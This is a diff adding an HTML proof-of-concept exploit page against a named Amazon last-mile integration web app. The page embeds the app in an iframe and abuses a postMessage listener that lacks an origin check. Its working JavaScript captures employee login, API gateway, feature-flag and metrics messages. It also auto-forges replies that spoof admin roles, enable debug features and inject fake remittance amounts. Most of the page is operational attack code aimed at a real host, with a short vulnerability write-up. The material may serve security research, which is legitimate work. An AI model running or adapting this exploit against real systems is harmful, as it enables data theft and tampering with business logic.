@@ -1,0 +1,477 @@
+<!--
+  PoC: postMessage Vulnerability in ui.cod-eu-integ.last-mile.amazon.dev
+  File: /static/js/main.7a31203e.js (Line 300 of aws.js.txt)
+
+  VULNERABILITY SUMMARY:
+  The child iframe registers window.addEventListener("message", l, false)
+  with NO origin check and NO e.source check. The dispatch function l()
+  routes messages to handlers based solely on e.data.method. Additionally,
+  ALL postMessage sends to window.parent use targetOrigin "*", leaking
+  data to any embedding origin.
+
+  ATTACK VECTORS DEMONSTRATED:
+  1. Data Exfiltration  - Embed the victim iframe; intercept all "*" postMessages
+  2. Response Injection - Send crafted messages to resolve pending promises
+  3. State Manipulation - Invoke dark mode handler to corrupt UI state
+-->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC - last-mile postMessage Exploitation</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+    h1 { color: #e94560; }
+    h2 { color: #ff6f61; margin-top: 30px; }
+    .log { background: #16213e; border: 1px solid #0f3460; padding: 15px; margin: 10px 0;
+           max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+    .captured { color: #00ff41; }
+    .injected { color: #ff6347; }
+    .info { color: #61dafb; }
+    button { background: #e94560; color: white; border: none; padding: 10px 20px;
+             margin: 5px; cursor: pointer; font-family: monospace; font-size: 14px; }
+    button:hover { background: #c81e45; }
+    iframe { width: 100%; height: 200px; border: 1px solid #0f3460; margin: 10px 0; }
+  </style>
+</head>
+<body>
+  <h1>postMessage Exploitation PoC</h1>
+  <p class="info">Target: ui.cod-eu-integ.last-mile.amazon.dev/static/js/main.7a31203e.js</p>
+
+  <!-- ============================================================ -->
+  <!-- ATTACK 1: Data Exfiltration via wildcard targetOrigin         -->
+  <!-- ============================================================ -->
+  <h2>Attack 1: Data Exfiltration (Passive Listener)</h2>
+  <p class="info">
+    The victim iframe sends ALL postMessages to window.parent with targetOrigin "*".
+    As the embedding page, we receive everything: feature flags, employee login data,
+    country codes, API gateway requests, and client-side metrics.
+  </p>
+  <div id="exfil-log" class="log">[*] Waiting for messages from victim iframe...</div>
+
+  <button onclick="loadVictimIframe()">Load Victim Iframe</button>
+  <button onclick="clearLog('exfil-log')">Clear Log</button>
+
+  <div id="iframe-container"></div>
+
+  <!-- ============================================================ -->
+  <!-- ATTACK 2: Response Injection (Active - Forge Responses)       -->
+  <!-- ============================================================ -->
+  <h2>Attack 2: Response Injection (Resolve Pending Promises)</h2>
+  <p class="info">
+    The victim's message listener has NO origin check:<br>
+    <code>function l(e){e.data.method&&S.hasOwnProperty(e.data.method)&&S[e.data.method](e.data)}</code><br><br>
+    We can send messages with any method name from the dispatch map (S)
+    to invoke handlers directly. If we know/guess a pending GUID, we can
+    resolve promises with attacker-controlled data.
+  </p>
+  <div id="inject-log" class="log">[*] Ready to inject responses...</div>
+
+  <button onclick="injectFakeFeatureFlags()">Inject Feature Flags</button>
+  <button onclick="injectFakeApiResponse()">Inject API Gateway Response</button>
+  <button onclick="injectFakeEmployeeLogin()">Inject TCP Employee Login</button>
+  <button onclick="injectFakeCountryCode()">Inject Country Code</button>
+  <button onclick="manipulateDarkMode()">Force Dark Mode</button>
+  <button onclick="bruteForceGuids()">Brute-Force GUIDs</button>
+  <button onclick="clearLog('inject-log')">Clear Log</button>
+
+  <!-- ============================================================ -->
+  <!-- ATTACK 3: Captured Data Analysis                              -->
+  <!-- ============================================================ -->
+  <h2>Attack 3: Captured Secrets & Session Data</h2>
+  <div id="secrets-log" class="log">[*] Analyzing captured data for sensitive values...</div>
+
+  <script>
+    // ============================================================
+    // GLOBALS
+    // ============================================================
+    var victimFrame = null;
+    var capturedMessages = [];
+    var capturedGuids = [];
+
+    // ============================================================
+    // ATTACK 1: Passive Exfiltration
+    // ============================================================
+    // Since the victim sends postMessage(..., "*"), we receive everything
+    window.addEventListener("message", function(e) {
+      var timestamp = new Date().toISOString();
+      var data = e.data;
+      var origin = e.origin;
+
+      // Log every captured message
+      capturedMessages.push({ time: timestamp, origin: origin, data: data });
+
+      appendLog("exfil-log",
+        '<span class="captured">[CAPTURED ' + timestamp + ']</span>\n' +
+        '  Origin: ' + origin + '\n' +
+        '  Method: ' + (data.method || 'N/A') + '\n' +
+        '  Data:   ' + JSON.stringify(data, null, 2) + '\n'
+      );
+
+      // Extract GUIDs from intercepted messages for Attack 2
+      if (data.guid) {
+        capturedGuids.push(data.guid);
+        appendLog("secrets-log",
+          '<span class="captured">[GUID CAPTURED] ' + data.guid + '</span>\n' +
+          '  From method: ' + data.method + '\n'
+        );
+      }
+
+      // Flag sensitive data
+      if (data.method === "getTcpEmployeeLogin") {
+        appendLog("secrets-log",
+          '<span class="injected">[SENSITIVE] TCP Employee Login request intercepted!</span>\n' +
+          '  Args: ' + JSON.stringify(data.args) + '\n'
+        );
+      }
+      if (data.method === "getAPIGatewayDataFromParent") {
+        appendLog("secrets-log",
+          '<span class="injected">[SENSITIVE] API Gateway request intercepted!</span>\n' +
+          '  Args: ' + JSON.stringify(data.args) + '\n'
+        );
+      }
+      if (data.method === "getFeatureStatus") {
+        appendLog("secrets-log",
+          '<span class="info">[FEATURE FLAGS] Feature status request intercepted!</span>\n' +
+          '  Features requested: ' + JSON.stringify(data.args) + '\n'
+        );
+      }
+      if (data.method === "publishClientSideMetrics") {
+        appendLog("secrets-log",
+          '<span class="info">[METRICS] Client-side metrics leaked!</span>\n' +
+          '  Metrics: ' + JSON.stringify(data.args) + '\n'
+        );
+      }
+    }, false);
+
+    function loadVictimIframe() {
+      var container = document.getElementById("iframe-container");
+      container.innerHTML = '';
+      var iframe = document.createElement("iframe");
+      // The victim app — it will postMessage to us (its parent) with "*"
+      iframe.src = "https://ui.cod-eu-integ.last-mile.amazon.dev/";
+      iframe.id = "victim";
+      container.appendChild(iframe);
+      victimFrame = iframe;
+      appendLog("exfil-log",
+        '<span class="info">[*] Victim iframe loaded. Listening for postMessages...</span>\n' +
+        '<span class="info">[*] The iframe will send us: getTcpEmployeeLogin, getFeatureStatus,</span>\n' +
+        '<span class="info">    getCountryCode, getDarkModeStatus, getAPIGatewayDataFromParent,</span>\n' +
+        '<span class="info">    publishClientSideMetrics — all with targetOrigin "*"</span>\n'
+      );
+    }
+
+    // ============================================================
+    // ATTACK 2: Active Response Injection
+    // ============================================================
+    // The victim's listener: function l(e){e.data.method&&S.hasOwnProperty(e.data.method)&&S[e.data.method](e.data)}
+    // No e.origin check. No e.source check. We can call any method in S.
+
+    function getVictimWindow() {
+      if (!victimFrame || !victimFrame.contentWindow) {
+        appendLog("inject-log",
+          '<span class="injected">[!] Load victim iframe first</span>\n');
+        return null;
+      }
+      return victimFrame.contentWindow;
+    }
+
+    // Generate a UUID in the same format as the victim's a() function
+    function generateGuid() {
+      function s4() {
+        return (65536 * (1 + Math.random()) | 0).toString(16).substring(1);
+      }
+      return (s4() + s4() + "-" + s4() + "-4" + s4().substr(0, 3) +
+              "-" + s4() + "-" + s4() + s4() + s4()).toLowerCase();
+    }
+
+    function injectFakeFeatureFlags() {
+      var w = getVictimWindow();
+      if (!w) return;
+
+      // Use a captured GUID if available, otherwise guess
+      var guid = capturedGuids.length > 0 ? capturedGuids.shift() : generateGuid();
+
+      var payload = {
+        method: "sendFeatureStatus",
+        guid: guid,
+        responseData: {
+          data: {
+            // Enable all features / disable security controls
+            "shadow_testing": true,
+            "lms_v2_enabled": true,
+            "debug_mode": true,
+            "admin_panel": true,
+            "bypass_auth": true
+          }
+        }
+      };
+
+      w.postMessage(payload, "*");
+      appendLog("inject-log",
+        '<span class="injected">[INJECTED] sendFeatureStatus</span>\n' +
+        '  GUID: ' + guid + '\n' +
+        '  Payload: ' + JSON.stringify(payload.responseData, null, 2) + '\n' +
+        '  Effect: Feature flags overwritten with attacker values\n'
+      );
+    }
+
+    function injectFakeApiResponse() {
+      var w = getVictimWindow();
+      if (!w) return;
+
+      var guid = capturedGuids.length > 0 ? capturedGuids.shift() : generateGuid();
+
+      var payload = {
+        method: "sendApiGatewayResponse",
+        guid: guid,
+        responseData: {
+          statusCode: 200,
+          body: {
+            remittanceId: "ATTACKER-CONTROLLED-001",
+            stationCode: "INJECTED",
+            amount: 999999.99,
+            status: "APPROVED"
+          }
+        }
+      };
+
+      w.postMessage(payload, "*");
+      appendLog("inject-log",
+        '<span class="injected">[INJECTED] sendApiGatewayResponse</span>\n' +
+        '  GUID: ' + guid + '\n' +
+        '  Payload: ' + JSON.stringify(payload.responseData, null, 2) + '\n' +
+        '  Effect: Fake API response injected into promise chain\n'
+      );
+    }
+
+    function injectFakeEmployeeLogin() {
+      var w = getVictimWindow();
+      if (!w) return;
+
+      var guid = capturedGuids.length > 0 ? capturedGuids.shift() : generateGuid();
+
+      var payload = {
+        method: "sendTcpEmployeeLoginResponse",
+        guid: guid,
+        childData: {
+          employeeId: "ATTACKER_INJECTED",
+          locale: '{"country":"XX","language":"en"}',
+          role: "admin",
+          stationCode: "FAKE_STATION"
+        }
+      };
+
+      w.postMessage(payload, "*");
+      appendLog("inject-log",
+        '<span class="injected">[INJECTED] sendTcpEmployeeLoginResponse</span>\n' +
+        '  GUID: ' + guid + '\n' +
+        '  Payload: ' + JSON.stringify(payload.childData, null, 2) + '\n' +
+        '  Effect: Fake employee login data injected — locale/role spoofed\n'
+      );
+    }
+
+    function injectFakeCountryCode() {
+      var w = getVictimWindow();
+      if (!w) return;
+
+      var guid = capturedGuids.length > 0 ? capturedGuids.shift() : generateGuid();
+
+      var payload = {
+        method: "sendCountryCodeResponse",
+        guid: guid,
+        childData: {
+          countryCode: "XX",
+          locale: '{"country":"XX","language":"en","region":"ATTACKER"}'
+        }
+      };
+
+      w.postMessage(payload, "*");
+      appendLog("inject-log",
+        '<span class="injected">[INJECTED] sendCountryCodeResponse</span>\n' +
+        '  GUID: ' + guid + '\n' +
+        '  Effect: Country/locale spoofed to attacker value\n'
+      );
+    }
+
+    function manipulateDarkMode() {
+      var w = getVictimWindow();
+      if (!w) return;
+
+      // The dark mode handler does NOT use guid/promise pattern:
+      // function c(e){w(e.childData.capability===b.i.DARK?b.i.DARK:b.i.LIGHT)}
+      // This directly invokes the state callback — no GUID needed!
+      var payload = {
+        method: "sendDarkModeStatus",
+        childData: {
+          capability: "dark"  // Forces dark mode
+        }
+      };
+
+      w.postMessage(payload, "*");
+      appendLog("inject-log",
+        '<span class="injected">[INJECTED] sendDarkModeStatus</span>\n' +
+        '  No GUID required — handler directly calls state setter\n' +
+        '  Effect: UI theme forcibly switched to dark mode\n'
+      );
+    }
+
+    function bruteForceGuids() {
+      var w = getVictimWindow();
+      if (!w) return;
+
+      appendLog("inject-log",
+        '<span class="info">[*] Brute-forcing GUIDs is impractical (UUID v4 = 2^122 space)</span>\n' +
+        '<span class="info">[*] But the REAL attack does not need GUIDs at all:</span>\n' +
+        '<span class="info">[*]   1. sendDarkModeStatus has no GUID check — direct state manipulation</span>\n' +
+        '<span class="info">[*]   2. We capture GUIDs from intercepted outbound messages (Attack 1)</span>\n' +
+        '<span class="info">[*]   3. Race condition: respond BEFORE the real parent does</span>\n\n'
+      );
+
+      // Demonstrate the race condition: listen for outbound message,
+      // immediately respond with our forged data before the real parent can
+      appendLog("inject-log",
+        '<span class="injected">[STRATEGY] Race Condition Attack:</span>\n' +
+        '  1. Victim iframe sends: {method:"getFeatureStatus", guid:"abc-123", args:{...}} to us\n' +
+        '  2. We immediately respond: {method:"sendFeatureStatus", guid:"abc-123", responseData:{...}}\n' +
+        '  3. Our response resolves the promise BEFORE the legitimate parent responds\n' +
+        '  4. Since we ARE the parent (we embedded the iframe), there is no race — we win 100%\n'
+      );
+    }
+
+    // ============================================================
+    // COMBINED ATTACK: Auto-respond to all requests
+    // ============================================================
+    // Since WE are the parent that embedded the iframe, all requests
+    // come TO US. We can auto-respond with attacker-controlled data.
+    window.addEventListener("message", function(e) {
+      if (!victimFrame) return;
+      var data = e.data;
+      if (!data || !data.method) return;
+
+      // Auto-respond to intercepted requests with forged data
+      var response = null;
+
+      if (data.method === "getFeatureStatus" && data.guid) {
+        response = {
+          method: "sendFeatureStatus",
+          guid: data.guid,
+          responseData: { data: { "all_features_enabled": true, "debug": true } }
+        };
+      }
+      else if (data.method === "getAPIGatewayDataFromParent" && data.guid) {
+        response = {
+          method: "sendApiGatewayResponse",
+          guid: data.guid,
+          responseData: { statusCode: 200, body: { injected: true } }
+        };
+      }
+      else if (data.method === "getTcpEmployeeLogin" && data.guid) {
+        response = {
+          method: "sendTcpEmployeeLoginResponse",
+          guid: data.guid,
+          childData: {
+            employeeId: "SPOOFED_ADMIN",
+            locale: '{"country":"US","language":"en"}',
+            role: "administrator"
+          }
+        };
+      }
+      else if (data.method === "getCountryCode" && data.guid) {
+        response = {
+          method: "sendCountryCodeResponse",
+          guid: data.guid,
+          childData: { countryCode: "US", locale: '{"country":"US"}' }
+        };
+      }
+
+      if (response && victimFrame.contentWindow) {
+        victimFrame.contentWindow.postMessage(response, "*");
+        appendLog("inject-log",
+          '<span class="injected">[AUTO-RESPOND] ' + data.method +
+          ' -> ' + response.method + ' (guid: ' + data.guid + ')</span>\n'
+        );
+      }
+    }, false);
+
+    // ============================================================
+    // UTILITY
+    // ============================================================
+    function appendLog(id, html) {
+      var el = document.getElementById(id);
+      el.innerHTML += html;
+      el.scrollTop = el.scrollHeight;
+    }
+    function clearLog(id) {
+      document.getElementById(id).innerHTML = "";
+    }
+  </script>
+
+  <!-- ============================================================ -->
+  <!-- EXPLOITATION NOTES                                            -->
+  <!-- ============================================================ -->
+  <h2>Exploitation Path Summary</h2>
+  <pre class="log" style="color: #ccc;">
+VULNERABILITY CHAIN:
+====================
+
+1. MISSING ORIGIN CHECK (CWE-346):
+   The iframe registers: window.addEventListener("message", l, false)
+   Handler l(e) dispatches on e.data.method WITHOUT checking e.origin or e.source.
+   ANY window can invoke any of the 5 handler functions.
+
+2. WILDCARD TARGET ORIGIN (CWE-201):
+   ALL outbound postMessage calls use targetOrigin "*":
+     window.parent.postMessage({method:"getTcpEmployeeLogin",...}, "*")
+     window.parent.postMessage({method:"getFeatureStatus",...}, "*")
+     window.parent.postMessage({method:"getAPIGatewayDataFromParent",...}, "*")
+     window.parent.postMessage({method:"getCountryCode",...}, "*")
+     window.parent.postMessage({method:"publishClientSideMetrics",...}, "*")
+     window.parent.postMessage({method:"getDarkModeStatus",...}, "*")
+   If an attacker embeds this iframe, they receive ALL of these messages.
+
+3. PROMISE INJECTION (CWE-940):
+   Handlers resolve promises using attacker-supplied data:
+     function u(e){y[e.guid]&&y[e.guid].resolve(e.responseData)}
+   Attacker can inject arbitrary responseData into the app's async data flow.
+
+4. VARIABLE SHADOWING BUG (Defense Weakness):
+   function o(e,t,r,n){var a=a();...new Promise(function(a,i){y[a].resolve=a...})}
+   The Promise callback parameter "a" shadows the outer GUID "a".
+   y[resolve_function].resolve = resolve_function (wrong key)
+   y[guid].resolve is NEVER set inside the Promise.
+   This means promise resolution via handler responses MAY SILENTLY FAIL,
+   but the timeout fallback (setTimeout -> y[a].resolve(b.n)) still works
+   because inside setTimeout, "a" = resolve function, so calling it works.
+
+   EXPLOITATION IMPACT OF BUG: The variable shadowing means the guid-based
+   promise resolution in handlers (u, d, f, s) may be broken. But this
+   actually HELPS the attacker for the dark mode vector (no guid needed)
+   and does NOT prevent data exfiltration (Attack 1 still works regardless).
+
+ATTACK SCENARIOS:
+=================
+
+A) CLICKJACKING + DATA THEFT:
+   Attacker hosts this PoC page, embeds victim iframe.
+   User visits attacker page. Iframe loads, sends requests to parent (*).
+   Attacker captures: employee login data, API requests, feature flags, metrics.
+
+B) RESPONSE FORGERY:
+   As the embedding parent, attacker intercepts all requests and
+   auto-responds with forged data. The iframe app processes attacker
+   data as if it came from the legitimate parent.
+   - Fake employee credentials -> locale/role spoofing
+   - Fake feature flags -> enable debug/admin features
+   - Fake API responses -> corrupt business logic (remittance amounts)
+
+C) UI MANIPULATION (No GUID Required):
+   sendDarkModeStatus handler directly calls state setter w() with
+   no GUID validation. Any origin can force theme changes.
+
+PREREQUISITES:
+   - Victim iframe must be embeddable (no X-Frame-Options / CSP frame-ancestors)
+   - No CSP frame-ancestors restriction was observed in the fetched content
+   - The domain is an internal "integ" (integration/staging) environment
+  </pre>
+</body>
+</html>
